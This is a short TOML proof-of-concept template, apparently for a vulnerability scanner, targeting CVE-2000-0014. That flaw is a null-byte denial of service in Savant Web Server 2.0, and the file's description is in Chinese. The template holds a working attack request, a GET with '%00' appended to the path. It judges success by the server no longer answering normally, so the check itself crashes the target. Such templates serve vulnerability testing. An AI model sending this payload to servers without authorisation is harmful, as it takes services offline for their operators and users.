[info]
author = "AVE"
description = "Savant Web Server 2.0 存在空字符拒绝服务漏洞(CVE-2000-0014)。远程攻击者通过向服务器发送包含空字符(%00)的HTTP GET请求，可导致Web服务进程崩溃或停止响应。漏洞源于服务器在解析URL时未正确处理空字符。"
id = "POC-AVE-2000-0013"
name = "CVE-2000-0014 PoC"
severity = "medium"
tags = [
    "cve-2000-0014",
    "ave-2000-0013",
]
vuln_id = [
    "CVE-2000-0014",
    "AVE-2000-0013",
]

[poc]
logic = "any"

[[poc.requests]]
method = "GET"
path = "/{{BaseURL}}/%00"
protocol = "http"

[[poc.requests.matchers]]
expect = false
part = "body"
type = "word"
words = ["Savant"]
